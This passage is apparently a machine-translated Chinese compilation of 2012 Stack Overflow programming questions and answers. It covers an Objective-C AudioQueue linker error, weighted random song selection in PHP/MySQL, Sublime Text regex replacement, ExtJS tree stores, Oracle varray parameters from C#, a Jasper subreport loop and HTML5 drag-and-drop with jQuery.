doc = ie.Document; 
```

# objective-c - XCode 4.5.1 AudioQueue 和链接器命令失败

> ID：12954503
> 
> 赞同：0
> 
> 时间：2012-10-18T12:20:45.727
> 
> 标签：objective-c, xcode, linker, linker-errors, audioqueue

我会尽可能地做到这一点。我会用我的音频队列录制声音。我有一个项目并添加了我的项目所需的所有框架（所以这不是问题）。我只更改了 2 个文件：

*   视图控制器.h
*   视图控制器.m

开始之前：我不确定文件类型（void）或（IBAction）（我无法测试）。

这是我的**ViewController.h的源代码**

```
#import <UIKit/UIKit.h>
//#import <AudioToolbox/AudioQueue.h>  //(don't know to use that) 
//#import <AudioToolbox/AudioFile.h>   //(don't know to use that)
#import <AudioUnit/AudioUnit.h>
#import <AudioToolbox/AudioToolbox.h>

#define NUM_BUFFERS 3
#define SECONDS_TO_RECORD 10

typedef struct
{
    AudioStreamBasicDescription  dataFormat;
    AudioQueueRef                queue;
    AudioQueueBufferRef          buffers[NUM_BUFFERS];
    AudioFileID                  audioFile;
    SInt64                       currentPacket;
    bool                         recording;
} RecordState;

typedef struct
{
    AudioStreamBasicDescription  dataFormat;
    AudioQueueRef                queue;
    AudioQueueBufferRef          buffers[NUM_BUFFERS];
    AudioFileID                  audioFile;
    SInt64                       currentPacket;
    bool                         playing;
} PlayState;

@interface ViewController : UIViewController{
    IBOutlet UILabel* labelStatus;
    IBOutlet UIButton* buttonRecord;
    IBOutlet UIButton* buttonPlay;
    RecordState recordState;
    PlayState playState;
    CFURLRef fileURL;
}

- (BOOL)getFilename:(char*)buffer maxLenth:(int)maxBufferLength;
- (void)setupAudioFormat:(AudioStreamBasicDescription*)format;
- (void)recordPressed:(id)sender;
- (void)playPressed:(id)sender;
- (IBAction)startRecording;
- (IBAction)stopRecording;
- (IBAction)startPlayback;
- (IBAction)stopPlayback; 
```

这是我的**ViewController.m的源代码**

（我在功能 startPlayback 评论中有错误）

```
#import "ViewController.h"
@interface ViewController ()
@end

@implementation ViewController

void AudioInputCallback(
                    void *inUserData,
                    AudioQueueRef inAQ,
                    AudioQueueBufferRef inBuffer,
                    const AudioTimeStamp *inStartTime,
                    UInt32 inNumberPacketDescriptions,
                    const AudioStreamPacketDescription *inPacketDescs)
{

    RecordState* recordState = (RecordState*)inUserData;

    if(!recordState->recording)
    {
        printf("Not recording, returning\n");
    }

    //if(inNumberPacketDescriptions == 0 && recordState->dataFormat.mBytesPerPacket != 0)
    //{
    //    inNumberPacketDescriptions = inBuffer->mAudioDataByteSize / recordState->dataFormat.mBytesPerPacket;
    //}

    printf("Writing buffer %lld\n", recordState->currentPacket);
    OSStatus status = AudioFileWritePackets(recordState->audioFile,
                                        false,
                                        inBuffer->mAudioDataByteSize,
                                        inPacketDescs,
                                        recordState->currentPacket,
                                        &inNumberPacketDescriptions,
                                        inBuffer->mAudioData);
    if(status == 0)
    {
        recordState->currentPacket += inNumberPacketDescriptions;
    }

    AudioQueueEnqueueBuffer(recordState->queue, inBuffer, 0, NULL);
}

void AudioOutputCallback(
                     void* inUserData,
                     AudioQueueRef outAQ,
                     AudioQueueBufferRef outBuffer)
{
    PlayState* playState = (PlayState*)inUserData;
    if(!playState->playing)
    {
        printf("Not playing, returning\n");
        return;
    }

    printf("Queuing buffer %lld for playback\n", playState->currentPacket);

    AudioStreamPacketDescription* packetDescs = NULL;

    UInt32 bytesRead;
    UInt32 numPackets = 8000;
    OSStatus status;
    status = AudioFileReadPackets(
                              playState->audioFile,
                              false,
                              &bytesRead,
                              packetDescs,
                              playState->currentPacket,
                              &numPackets,
                              outBuffer->mAudioData);

    if(numPackets)
    {
        outBuffer->mAudioDataByteSize = bytesRead;
        status = AudioQueueEnqueueBuffer(
                                     playState->queue,
                                     outBuffer,
                                     0,
                                     packetDescs);

        playState->currentPacket += numPackets;
    }
    else
    {
        if(playState->playing)
        {
            AudioQueueStop(playState->queue, false);
            AudioFileClose(playState->audioFile);
            playState->playing = false;
        }

        AudioQueueFreeBuffer(playState->queue, outBuffer);
    }    
}

- (void)setupAudioFormat:(AudioStreamBasicDescription*)format
{
    format->mSampleRate = 8000.0;
    format->mFormatID = kAudioFormatLinearPCM;
    format->mFramesPerPacket = 1;
    format->mChannelsPerFrame = 1;
    format->mBytesPerFrame = 2;
    format->mBytesPerPacket = 2;
    format->mBitsPerChannel = 16;
    format->mReserved = 0;
    format->mFormatFlags = kLinearPCMFormatFlagIsBigEndian |
    kLinearPCMFormatFlagIsSignedInteger |
    kLinearPCMFormatFlagIsPacked;
}

- (void)recordPressed:(id)sender
{
    if(!playState.playing)
    {
        if(!recordState.recording)
        {
            printf("Starting recording\n");
            [self startRecording];
        }
        else
        {
            printf("Stopping recording\n");
            [self stopRecording];
        }
    }
    else
    {
        printf("Can't start recording, currently playing\n");
    }
}

- (void)playPressed:(id)sender
{
    if(!recordState.recording)
    {
        if(!playState.playing)
        {
            printf("Starting playback\n");
            [self startPlayback];
        }
        else
        {
            printf("Stopping playback\n");
            [self stopPlayback];
        }
    }
}

- (IBAction)startRecording
{
    [self setupAudioFormat:&recordState.dataFormat];

    recordState.currentPacket = 0;

    OSStatus status;
    status = AudioQueueNewInput(&recordState.dataFormat,
                                AudioInputCallback,
                                &recordState,
                                CFRunLoopGetCurrent(),
                                kCFRunLoopCommonModes,
                                0,
                                &recordState.queue);

    if(status == 0)
    {
        for(int i = 0; i < NUM_BUFFERS; i++)
        {
            AudioQueueAllocateBuffer(recordState.queue,
                                     16000, &recordState.buffers[i]);
            AudioQueueEnqueueBuffer(recordState.queue,
                                    recordState.buffers[i], 0, NULL);
        }

        status = AudioFileCreateWithURL(fileURL,
                                        kAudioFileAIFFType,
                                        &recordState.dataFormat,
                                        kAudioFileFlags_EraseFile,
                                        &recordState.audioFile);
        if(status == 0)
        {
            recordState.recording = true;
            status = AudioQueueStart(recordState.queue, NULL);
            if(status == 0)
            {
                labelStatus.text = @"Recording";
            }
        }
    }

    if(status != 0)
    {
        [self stopRecording];
        labelStatus.text = @"Record Failed";
    }
}

- (IBAction)stopRecording
{
    recordState.recording = false;

    AudioQueueStop(recordState.queue, true);
    for(int i = 0; i < NUM_BUFFERS; i++)
    {
        AudioQueueFreeBuffer(recordState.queue,
                             recordState.buffers[i]);
    }

    AudioQueueDispose(recordState.queue, true);
    AudioFileClose(recordState.audioFile);
    labelStatus.text = @"Idle";
}

- (IBAction)startPlayback
{
    playState.currentPacket = 0;

    [self setupAudioFormat:&playState.dataFormat];

    OSStatus status;

    // I get here an error
    // Use of undeclared identifier 'fsRdPerm'
    // How to fix that?
    status = AudioFileOpenURL(fileURL, fsRdPerm, kAudioFileAIFFType, &playState.audioFile);

    if(status == 0)
    {
        status = AudioQueueNewOutput(
                                     &playState.dataFormat,
                                     AudioOutputCallback,
                                     &playState,
                                     CFRunLoopGetCurrent(),
                                     kCFRunLoopCommonModes,
                                     0,
                                     &playState.queue);

        if(status == 0)
        {
            playState.playing = true;
            for(int i = 0; i < NUM_BUFFERS && playState.playing; i++)
            {
                if(playState.playing)
                {
                    AudioQueueAllocateBuffer(playState.queue, 16000, &playState.buffers[i]);
                    AudioOutputCallback(&playState, playState.queue, playState.buffers[i]);
                }
            }

            if(playState.playing)
            {
                status = AudioQueueStart(playState.queue, NULL);
                if(status == 0)
                {
                    labelStatus.text = @"Playing";
                }
            }
        }
    }

    if(status != 0)
    {
        [self stopPlayback];
        labelStatus.text = @"Play failed";
    }
}

- (void)stopPlayback
{
    playState.playing = false;

    for(int i = 0; i < NUM_BUFFERS; i++)
    {
        AudioQueueFreeBuffer(playState.queue, playState.buffers[i]);
    }

    AudioQueueDispose(playState.queue, true);
    AudioFileClose(playState.audioFile);
}

- (BOOL)getFilename:(char*)buffer maxLenth:(int)maxBufferLength
{
    NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,
                                                         NSUserDomainMask, YES);
    NSString* docDir = [paths objectAtIndex:0];
    NSString* file = [docDir stringByAppendingString:@"/recording.aif"];
    return [file getCString:buffer maxLength:maxBufferLength encoding:NSUTF8StringEncoding];
}

- (void)viewDidLoad
{
    [super viewDidLoad];
        // Do any additional setup after loading the view, typically from a nib.
}

- (void)didReceiveMemoryWarning
{
    [super didReceiveMemoryWarning];
        // Dispose of any resources that can be recreated.
}

@end 
```

我不知道如何解决这个问题，我可以使用我的项目。如果我将功能 startPlayback 注释掉，我会收到此错误：

> ld /Users/NAME/Library/Developer/Xcode/DerivedData/recorder_test2-gehymgoneospsldgfpxnbjdapebu/Build/Products/Debug-iphonesimulator/recorder_test2.app/recorder_test2 normal i386 cd /Users/NAME/Desktop/recorder_test2 setenv IPHONEOS_DEPLOYMENT_TARGET 6.0 setenv PATH "/Applications /Xcode.app/Contents/Developer/Platforms/iPhoneSimulator.platform/Developer/usr/bin:/Applications/Xcode.app/Contents/Developer/usr/bin:/usr/bin:/bin:/usr/sbin:/ sbin" /Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/bin/clang -arch i386 -isysroot /Applications/Xcode.app/Contents/Developer/Platforms/iPhoneSimulator.platform/Developer/SDKs/ iPhone模拟器6.0。sdk -L/Users/NAME/Library/Developer/Xcode/DerivedData/recorder_test2-gehymgoneospsldgfpxnbjdapebu/Build/Products/Debug-iphonesimulator -F/Users/NAME/Library/Developer/Xcode/DerivedData/recorder_test2-gehymgoneospsldgfpxnbjdapebu/Build/Products/ Debug-iphonesimulator -filelist /Users/NAME/Library/Developer/Xcode/DerivedData/recorder_test2-gehymgoneospsldgfpxnbjdapebu/Build/Intermediates/recorder_test2.build/Debug-iphonesimulator/recorder_test2.build/Objects-normal/i386/recorder_test2.LinkFileList -Xlinker - objc_abi_version -Xlinker 2 -fobjc-arc -fobjc-link-runtime -Xlinker -no_implicit_dylibs -mios-simulator-version-min=6。0 -framework AudioToolbox -framework AudioUnit -framework CoreAudio -framework UIKit -framework Foundation -framework CoreGraphics -o /Users/NAME/Library/Developer/Xcode/DerivedData/recorder_test2-gehymgoneospsldgfpxnbjdapebu/Build/Products/Debug-iphonesimulator/recorder_test2.app/记录器_test2
> 
> ld：找不到框架 AudioUnit clang：错误：链接器命令失败，退出代码为 1（使用 -v 查看调用）

请使用这两个源文件并自己测试并帮助我。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-18T12:31:00.773

只需在您的项目设置中添加 AudioUnit 并确保您有正确的路径。

![在此处输入图像描述](../Images/0dfe7b46ff0ca72d6077ea6c7bc7fe28.png)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-03T20:22:19.470

从您的项目中删除 AudioUnit.framework 并替换`fsRdPerm`为`kAudioFileReadPermission`.

很长的故事：

虽然经过谷歌长途旅行后我找不到任何证据，但我几乎可以肯定`fsRdPerm`iOS 6 的任何音频框架中都不再存在。我在 iOS6 模拟器中搜索过它，它只出现在 CarbonCore.framework 中，这是一个遗留框架，因此很旧：

```
pwds2622:Frameworks mac$ pwd
/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneSimulator.platform/Developer/SDKs/iPhoneSimulator6.0.sdk/System/Library/Frameworks
s2622:Frameworks mac$ grep -sr fsRdPerm .
./CoreServices.framework/Frameworks/CarbonCore.framework/Headers/Files.h:  fsRdPerm                      = 0x01,
./CoreServices.framework/Frameworks/CarbonCore.framework/Versions/A/Headers/Files.h:  fsRdPerm                      = 0x01,
./CoreServices.framework/Frameworks/CarbonCore.framework/Versions/Current/Headers/Files.h:  fsRdPerm                      = 0x01,
./CoreServices.framework/Versions/A/Frameworks/CarbonCore.framework/Headers/Files.h:  fsRdPerm                      = 0x01,
./CoreServices.framework/Versions/A/Frameworks/CarbonCore.framework/Versions/A/Headers/Files.h:  fsRdPerm                      = 0x01,
./CoreServices.framework/Versions/A/Frameworks/CarbonCore.framework/Versions/Current/Headers/Files.h:  fsRdPerm                      = 0x01,
./CoreServices.framework/Versions/Current/Frameworks/CarbonCore.framework/Headers/Files.h:  fsRdPerm                      = 0x01,
./CoreServices.framework/Versions/Current/Frameworks/CarbonCore.framework/Versions/A/Headers/Files.h:  fsRdPerm                      = 0x01,
./CoreServices.framework/Versions/Current/Frameworks/CarbonCore.framework/Versions/Current/Headers/Files.h:  fsRdPerm                      = 0x01, 
```

我发现论坛帖子建议使用`kAudioFileReadPermission`而不是`fsRdPerm`. 这行得通，事实上，文档`kAudioFileReadPermission`说这是“与 AudioFileOpenURL 和 AudioFileOpen 函数一起使用的标志”之一。阅读更多[音频文件权限标志](http://developer.apple.com/library/ios/documentation/MusicAudio/Reference/AudioFileConvertRef/Reference/reference.html#//apple_ref/doc/uid/TP40006072-CH7-SW16)。

# php - 根据 x 个权重选择 x 个随机行

> ID：12954508
> 
> 赞同：0
> 
> 时间：2012-10-18T12:20:58.983
> 
> 标签：php, mysql, probability

我需要根据它们的流派生成歌曲列表。列表中返回每种类型的多少取决于用户对它们的加权方式。

所以他们可能会设置...

```
Rock  -  5 out of 10
Pop   -  2 out of 10
Dance -  1 out of 10
Folk  - 10 out of 10 
```

数据库表中的每个轨道都有一个`genre_id`：

```
Rock  = 1
Pop   = 2
Dance = 3
Folk  = 4 
```

他们还可以选择返回多少曲目，因此可能是 10、20... 最多 100。

我有 2 张桌子

```
TRACKS
id (INT)
track_name (VARCHAR)
genre_id (INT)

GENRES
id (INT)
name (VARCHAR) 
```

我正在使用 MySQL 和 PHP 来完成这个，任何帮助都会很棒

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-18T14:16:27.877

这工作得很好。但是，在某些情况下，歌曲总数会出现四舍五入错误（从不超过 1）；

```
/*
 * It's more likely to fill the first two arrays from a query, but for 
 * the example I defined them like
 * genreId => value
 */
$genres = array(
    1 => 'rock',
    2 => 'pop',
    3 => 'dance',
    4 => 'folk',
    27 => 'classical'
);

$pointsPerGenre = array(
    1 => 5, //rock, 5 out of 10
    2 => 2, //pop, 2 out of 10
    3 => 1, //etc...
    4 => 10,
    27 => 7
);

$totalPoints  = array_sum($pointsPerGenre);

$numberOfSongs = 20;

$songsPerPoint = $numberOfSongs / $totalPoints;

$songsPerGenre = array();
foreach(array_keys($genres) as $genreId)
{
    $songsPerGenre[$genreId] = round($pointsPerGenre[$genreId] * $songsPerPoint);
}

$queryParts = array();
foreach($songsPerGenre as $genreId => $numberOfSongsPerGenre)
{
    $queryParts[] = "(SELECT * FROM TRACKS WHERE genre_id = $genreId ORDER BY RAND() LIMIT $numberOfSongsPerGenre)";
}

$query = implode("\nUNION\n", $queryParts); 
```

这将输出以下查询（您可以在其中看到舍入误差，在这种情况下用户会收到一首奖励歌曲）：

```
(SELECT * FROM TRACKS WHERE genre_id = 1 ORDER BY RAND() LIMIT 4)
UNION
(SELECT * FROM TRACKS WHERE genre_id = 2 ORDER BY RAND() LIMIT 2)
UNION
(SELECT * FROM TRACKS WHERE genre_id = 3 ORDER BY RAND() LIMIT 1)
UNION
(SELECT * FROM TRACKS WHERE genre_id = 4 ORDER BY RAND() LIMIT 8)
UNION
(SELECT * FROM TRACKS WHERE genre_id = 27 ORDER BY RAND() LIMIT 6) 
```

# regex - 在 Sublime Text 2 中使用正则表达式更改数字

> ID：12954514
> 
> 赞同：0
> 
> 时间：2012-10-18T12:21:06.550
> 
> 标签：regex, sublimetext2, replace

我试图`5`在每个`1value`+ `px`so `1px`should become`15px`和`100px`should become之间插入`1005px`。

我正在搜索`1(.*?)px`并替换为，`1$15px`但这不起作用...

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-05-30T19:13:24.357

自从有人问这个问题以来已经有一段时间了，但是对于遇到类似问题的其他人来说，这里有一个简单的答案。

在 Sublime Text 2 中，以下替换字符串将为您提供所需的结果。

```
1${1}5px 
```

示例文本：

```
1px 
100px 1px and 100px

1px 100px 1px and 100px 1px 
100px 1px and 100px1px 
100px 1px and 100px 
```

找什么：

```
1(.*?)px 
```

用。。。来代替：

```
1${1}5px 
```

结果：

```
15px 
1005px 15px and 1005px

15px 1005px 15px and 1005px 15px 
1005px 15px and 1005px15px 
1005px 15px and 1005px 
```

这使用*命名*组替换`${ name }`而不是*数字*组替换`$ number`。在这种情况下，数字一代表名称。

由于某种原因，当数字跟随编号组时，Sublime Text 2 正则表达式引擎无法很好地进行替换。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-18T12:29:57.000

您的替换可能看起来像捕获组`$15`而不是`$1`. 我不熟悉 sublimetext2 但你可能需要像这样逃避你的替换：

```
s/1(.*?)px/1${1}5px/ 
```

这肯定是 perl 中的正确语法，看起来与您正在使用的语法非常相似。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-13T10:43:58.137

Sublime Text 2 使用反斜杠来指代捕获组，`\1`而不是`$1`

找什么：`(1\d*) ?px`

用。。。来代替：`\15px`

由于没有捕获组 15，这将正常工作。

# extjs4.1 - extjs 中的迭代数据存储

> ID：12954515
> 
> 赞同：0
> 
> 时间：2012-10-18T12:21:07.593
> 
> 标签：extjs4.1

我想使用 ext-js 4.1 创建分层选项卡（它们可以达到 n 级）。我正在尝试为选项卡层次结构创建一个如下所示的商店。所以我可以使用通用方法来创建选项卡。我如何遍历这个商店结构来创建分层标签？

希望下面的结构是可读的 :-) 清楚地显示每个级别和选项卡的深度。

```
"toptab1": [{

"id" : 1000

"name" : "coo",

"child": [{

    "id": 1 ,

        "name": "foo" ,

        "child": [{

        "id" :  11 ,  

                "name": "roo" ,

                "child": [{

                        "id" : 111,

                            "name" : "hoo"

                    },

        {

            "id: 112,

            "name": "poo"

        }]

                  },

                  {

                     "id" : 12 ,

                     "name" : "too"

            }]

},

{

    "id" : 2,

    "name" : "woo",

    "child" :[{

        "id": 21,

        "name" : "soo"

        "child" : [{

            "id" : 211,

            "name" : "boo"

        }]

    },

    {

        "id" : 22,

        "name" : "doo"

    }]

},

{

    "id" : 3,

    "name": "zoo"

}]; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-29T23:21:46.177

我会创建一个模型来存储有关您的选项卡的信息。

然后使用 TreeStore 将它们存储在正确的层次结构中。

然后你可以做类似的事情。

```
var topLevel = this.getTabStore().getRootNode();
topLevel.cascadeBy(function(tab) {
    //Do what you want with each tab here.
}); 
```

[http://docs.sencha.com/ext-js/4-1/#!/api/Ext.data.TreeStore-method-getRootNode](http://docs.sencha.com/ext-js/4-1/#!/api/Ext.data.TreeStore-method-getRootNode)

[http://docs.sencha.com/ext-js/4-1/#!/api/Ext.data.NodeInterface-method-cascadeBy](http://docs.sencha.com/ext-js/4-1/#!/api/Ext.data.NodeInterface-method-cascadeBy)

# c# - 使用来自 C# 的参数输入可变数组调用 Oracle 存储过程

> ID：12954518
> 
> 赞同：0
> 
> 时间：2012-10-18T12:21:10.483
> 
> 标签：c#, oracle, stored-procedures, varray, paramarray

`varchar2`我在 Oracle 中有一个存储过程，它接收可变数组类型的输入参数。该过程有效，如果您从 SQL 调用它，我需要从 C# 调用它。

我的脚本是这样的：

```
CREATE OR REPLACE PROCEDURE INTEGRATOR.PRC_TEST_PARAM_ARRAY  (p_nros_moviles integrator.NROMOVIL_ARRAY) IS
BEGIN
  FOR i IN 1..p_nros_moviles.count LOOP
    IF p_nros_moviles(i) IS NOT NULL THEN                               
      INSERT INTO INTEGRATOR.TEST_PARAM_ARRAY VALUES (p_nros_moviles(i));
    END IF;
  END LOOP;
END;
/ 
```

我的用户类型：

```
CREATE OR REPLACE TYPE INTEGRATOR.NROMOVIL_ARRAY AS
    VARYING ARRAY(100) OF VARCHAR2(15);
/ 
```

我从 PLSQL 调用

```
DECLARE
  v_array integrator.NROMOVIL_ARRAY;
BEGIN
  v_array := integrator.NROMOVIL_ARRAY('9999999', '66666666');

  integrator.prc_test_param_array(v_array);

END; 
```

我从 c# 尝试这种方式

```
try
{
    using (OracleConnection connection = new OracleConnection())
    {
        connection.ConnectionString = "Data Source=(DESCRIPTION=(ADDRESS_LIST=(ADDRESS=(PROTOCOL=TCP)" +
                                      "(HOST=10.10.10.10)(PORT=1521)))(CONNECT_DATA=(SERVER=DEDICATED)" +
                                      "(SID=PORTANODE)));User Id=user;Password=*****;";

        using (OracleCommand cmd = new OracleCommand("INTEGRATOR.PRC_TEST_PARAM_ARRAY", connection))
        {
            cmd.CommandType = CommandType.StoredProcedure;

            OracleParameter p = new OracleParameter();
            p.ParameterName = "P_NROS_MOVILES";
            p.OracleDbType = OracleDbType.Array;
            p.Direction = ParameterDirection.Input;

            p.UdtTypeName = "INTEGRATOR.NROMOVIL_ARRAY";
            //p.CollectionType = OracleCollectionType.PLSQLAssociativeArray;
            p.Value = new string[] { "XXXX", "YYYY" };
            cmd.Parameters.Add(p);

            connection.Open();

            cmd.ExecuteNonQuery();

            MessageBox.Show("Ejecutado");
        }
    }
}
catch (Exception ex)
{
    MessageBox.Show(ex.Message);
} 
```

有人可以指导我我需要进行更改才能使其正常工作

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-20T14:04:45.777

耐心点，等等等等..这需要很长时间..这是我的经验

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-23T09:31:46.557

我不确定，但我认为 System.Data.OracleClient 并不真正支持用户定义的数组。

我会尝试编写一个帮助存储函数，例如一个逗号分隔的字符串（这些将是您的 varray 类型的值），并使用 WHILE LOOP 和 SUBSTR 将其拆分为值。然后在每次迭代中，它使用 EXTEND(1) 将实际的 VARCHAR2 添加到临时积分器.NROMOVIL_ARRAY 类型变量中，以便为新值留出位置。

最后函数返回临时积分器.NROMOVIL_ARRAY，这个值可以在存储过程中使用。

# java - Jasper 报告：子报告导致无限循环

> ID：12954519
> 
> 赞同：6
> 
> 时间：2012-10-18T12:21:13.430
> 
> 标签：java, jasper-reports

我在整个应用程序中有多个*Jasper 报告*（带有子报告）。出于某种原因，一份报告（也包含子报告）不再起作用。调试了1天多，发现进入死循环，不断创建线程进行子报表填充。

调试器不断循环：

**JRSubReportRunnable.java**

```
public void run()
{
    running = true;     
    error = null;

    try
    {
        fillSubreport.fillSubreport();
    }
    catch (JRFillInterruptedException e)
    {
        //If the subreport filler was interrupted, we should remain silent
    }
    // we have to catch Throwable, because it is difficult to say what would happen with the master
    // filler thread in case we don't
    catch (Throwable t) //NOPMD
    {
        error = t;
    }

    running = false;
} 
```

上述方法启动一个线程以填充子报告。完成后，设置`running = false`和调试器可以：

**JRThreadSubreportRunner.java**

```
public void run()
{
    super.run();

    if (log.isDebugEnabled())
    {
        log.debug("Fill " + subreportFiller.fillerId + ": notifying of completion");
    }

    synchronized (subreportFiller)
    {
        //main filler notified that the subreport has finished
        subreportFiller.notifyAll();
    }
} 
```

一旦线程完成，它就会到达上面的方法`subreportFiller.notifyAll();`行。然后，调试器返回到**JRSubreportRunnable.java**，依此类推。

从理论上讲，如果我有 5 个子报告，它应该创建 5 个线程（适用于其他报告）。不幸的是，对于这种情况，它不断创建线程，并且我的调试器在上述两种方法之间“卡住”（仅供参考：这些类来自*jasperreports-3.7.6-sources.jar*）。

**也试过：**

我发现了一个[类似的 StackOverflow 问题](https://stackoverflow.com/questions/8843917/subreport-causing-infinite-loop)，但那里提出的答案对我不起作用。[JasperSoft Community 上的这个线程](http://jasperforge.org/node/527078)中提出的任何解决方案也没有。

我真的不明白为什么会出现这个问题。我敢肯定这是一件小事，因为它曾经工作过。希望其他人偶然发现了这一点并可能有解决方案。提前感谢您的任何回答。（我知道我没有提供关于我的子报告内容的真正信息，但它非常私密；不过，我可以向您保证，报告和相关子报告的内容没有改变 - 用 Git 检查)

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-14T14:09:09.163

我遇到了完全相同的问题，并通过将我的子报告的 isPrintWhenDetailOverflows 属性从 true 更改为 false 来解决它，如下所示：http: [//community.jaspersoft.com/questions/527078/infinite-loop-subreport-fill](http://community.jaspersoft.com/questions/527078/infinite-loop-subreport-fill)

希望能帮助到你

# java - 将标识符与字符串、数字和 _ 匹配

> ID：12954521
> 
> 赞同：0
> 
> 时间：2012-10-18T12:21:15.020
> 
> 标签：java, regex, jflex

```
[a-zA-Z]_*[a-zA-Z0-9]* 
```

我的目标是匹配：

```
astring_something;
helloall90 
```

但不是 ：

```
Astring
_helloall 
```

我的正则表达式保护我的标识符应该以小写字母开头。但它不适用于`_`案例。传递字符串：

```
astring_something; 
```

未被正确识别。它被确定为`astring`并`something`遗漏`_`。

我在哪里犯错误？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-18T12:25:33.890

我想你希望它以一个字母开头，后跟零个或多个字母、数字或下划线。如果是这样，您需要将下划线移动到第二组字符中。

改变：

```
[a-zA-Z]_*[a-zA-Z0-9]* 
```

至：

```
[a-zA-Z][a-zA-Z0-9_]* 
```

或者，如果它必须以小写字母开头：

```
[a-z][a-zA-Z0-9_]* 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-18T12:24:05.767

您当前仅匹配下划线前的*单个*字符。

```
[a-zA-Z]*_[a-zA-Z0-9]* 
```

这是否是您真正想要的，是一个不同的问题。例如，带有多个下划线的东西呢？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-18T19:32:45.837

尝试

```
^[a-z]+_*[a-zA-Z0-9]+ 
```

在哪里 ...

```
^[a-z]+ 
```

表示它必须以一个或多个小写字母开头，后跟 ...

```
_* 
```

零个或多个 _ 字符，后跟 ...

```
[a-zA-Z0-9]* 
```

零个或多个字母数字字符。

此模式将匹配 astring_something 和 helloall90 但不匹配 _helloall 和 Astring

# jquery - jQuery重复脚本

> ID：12954527
> 
> 赞同：0
> 
> 时间：2012-10-18T12:21:39.760
> 
> 标签：jquery

我对图像淡入淡出有问题。图像正在加载，没有适当的延迟。这是代码：

```
 $(function goback(){

    $("#img1").fadeIn("slow").delay(5000).fadeOut("slow");
    $("#img2").delay(5000).fadeIn("slow").delay(5000).fadeOut("slow");
    $("#img3").delay(5000).fadeIn("slow").delay(5000).fadeOut("slow");
    (function(){

    setTimeout(goback(), 5000);
})();
    }); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-18T12:25:33.390

检查您正在使用的 JQuery 版本。它可能是旧的。

此代码工作正常：http: [//jsfiddle.net/b85hx/15/](http://jsfiddle.net/b85hx/15/)

使用您的示例：http: [//jsfiddle.net/b85hx/16/](http://jsfiddle.net/b85hx/16/)

# jquery - jQuery HTML5 文件拖放

> ID：12954529
> 
> 赞同：14
> 
> 时间：2012-10-18T12:21:40.373
> 
> 标签：jquery, html, drag-and-drop

我查看了许多使用 AJAX 拖放将图像上传到服务器的脚本。我发现的脚本不是 jQuery，非常大，并且不完全符合我的要求。

将来它应该使用 jQuery、AJAX 和 PHP 上传图像。

**我的问题**

在许多示例中，我都查看了 e.dataTransfer.files 的工作。在我的情况下，它没有。我需要以某种方式绑定它吗？

我尽可能地想要 jQuery。

**提琴手**

随心所欲地玩...

[http://jsfiddle.net/AMjEz/](http://jsfiddle.net/AMjEz/)

**代码**

```
<html>
    <head>
        <style type="text/css">
            #dropzone {
                border: 2px dashed #ccc;
                width: 300px;
                height: 200px;
            }
        </style>
        <script src="//ajax.googleapis.com/ajax/libs/jquery/1.8.2/jquery.min.js"></script>
        <script type="text/javascript">
            jQuery(document).ready(function($) {
                $('#dropzone').on({
                    dragenter: function(e) {
                        $(this).css('background-color', 'lightBlue');
                    },
                    dragleave: function(e) {
                        $(this).css('background-color', 'white');
                    },
                    drop: function(e) {
                        e.stopPropagation();
                        e.preventDefault();
                        console.log(e.dataTransfer.files);
                    }
                });
            });
        </script>
    </head>
    <body>
        <div id="dropzone">
            Drop files here
        </div>
    </body>
</html> 
```

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2013-04-04T11:04:45.623

我为我的应用程序写了一个扩展。

```
// Custom file drop extension
$.fn.extend({
    filedrop: function (options) {
        var defaults = {
            callback : null
        }
        options =  $.extend(defaults, options)
        return this.each(function() {
            var files = []
            var $this = $(this)

            // Stop default browser actions
            $this.bind('dragover dragleave', function(event) {
                event.stopPropagation()
                event.preventDefault()
            })

            // Catch drop event
            $this.bind('drop', function(event) {
                // Stop default browser actions
                event.stopPropagation()
                event.preventDefault()

                // Get all files that are dropped
                files = event.originalEvent.target.files || event.originalEvent.dataTransfer.files

                // Convert uploaded file to data URL and pass trought callback
                if(options.callback) {
                    var reader = new FileReader()
                    reader.onload = function(event) {
                        options.callback(event.target.result)
                    }
                    reader.readAsDataURL(files[0])
                }
                return false
            })
        })
    }
}) 
```

我们可以这样使用它

```
// Event listener filedropper
$('.dropbox').filedrop({
    callback : function(fileEncryptedData) {
        // a callback?
    }
}) 
```

## 编辑

如果要删除多个文件，则应在 FileReader 周围编写一个 for 循环，如下所示：

```
...
if(options.callback) {
    for (i = 0; i < files.length; i++) {
        var reader = new FileReader()
        reader.onload = function(event) {
            options.callback(event.target.result)
        }
        reader.readAsDataURL(files[0])
    }
}
... 
```

JSFiddle：http: [//jsfiddle.net/646xe1m2/](http://jsfiddle.net/646xe1m2/)

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2012-10-18T12:57:08.437

我发现这是 jQuery.1.8 中的一个错误。这一行应该在之前`$('.dropzone')`。

```
$.event.props.push('dataTransfer'); 
```

**最终的 HTML 代码**

```
<html>
    <head>
        <style type="text/css">
            .dropzone {
                border: 2px dashed #ccc;
                width: 300px;
                height: 200px;
            }
        </style>
        <script src="//ajax.googleapis.com/ajax/libs/jquery/1.8.2/jquery.min.js"></script>
        <script type="text/javascript">
            jQuery(document).ready(function($) {
                var filename = '';
                var image_data = '';

                $.event.props.push('dataTransfer');
                $('.dropzone').on({
                    dragenter: function(e) {
                        $(this).css('background-color', 'lightBlue');
                    },
                    dragleave: function(e) {
                        $(this).css('background-color', 'white');
                    },
                    drop: function(e) {
                        e.stopPropagation();
                        e.preventDefault();

